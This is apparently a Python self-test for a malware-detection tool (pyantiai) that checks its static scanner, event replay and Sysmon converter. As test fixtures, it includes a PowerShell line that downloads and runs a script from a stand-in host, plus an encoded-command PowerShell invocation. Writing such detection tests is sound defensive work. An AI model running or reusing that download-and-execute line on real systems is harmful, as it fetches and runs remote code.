import tempfile
from pathlib import Path
import sys

PROJECT_ROOT_FOR_IMPORTS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT_FOR_IMPORTS))

from pyantiai.behavior import replay_jsonl
from pyantiai.cli import main
from pyantiai.ioc import IocStore
from pyantiai.paths import DEFAULT_IOC_DIR, DEFAULT_RULES_FILE, PROJECT_ROOT
from pyantiai.severity import decide
from pyantiai.static_scan import StaticScanner
from pyantiai.sysmon import convert_sysmon_event


def run():
    ioc = IocStore(DEFAULT_IOC_DIR)
    scanner = StaticScanner(ioc, DEFAULT_RULES_FILE)

    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "suspicious.ps1"
        path.write_text("IEX (New-Object Net.WebClient).DownloadString('http://malicious.test/a.ps1')\n", encoding="utf-8")
        result = scanner.scan_file(path, debug=True)
        detection = decide(path, result["signals"])
        assert detection["score"] >= 40
        assert any(item["category"] == "powershell_downloader" for item in result["signals"])

    replay = replay_jsonl(PROJECT_ROOT / "examples" / "events.jsonl", ioc)
    assert replay["detection"]["score"] >= 100
    assert any(item["category"] == "process_injection" for item in replay["signals"])

    sysmon_xml = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
        <EventID>1</EventID>
        <EventRecordID>42</EventRecordID>
        <TimeCreated SystemTime="2026-01-01T10:00:00.0000000Z"/>
      </System>
      <EventData>
        <Data Name="ProcessId">1100</Data>
        <Data Name="ParentProcessId">1000</Data>
        <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
        <Data Name="CommandLine">powershell.exe -EncodedCommand SQBFAFgA</Data>
        <Data Name="Signature">Unknown</Data>
      </EventData>
    </Event>"""
    converted = convert_sysmon_event(sysmon_xml)
    assert converted[0]["type"] == "process.start"
    assert converted[0]["pid"] == 1100

    assert main(["scan", str(PROJECT_ROOT / "examples" / "events.jsonl")]) == 0
    print("Python self-test passed.")


if __name__ == "__main__":
    run()
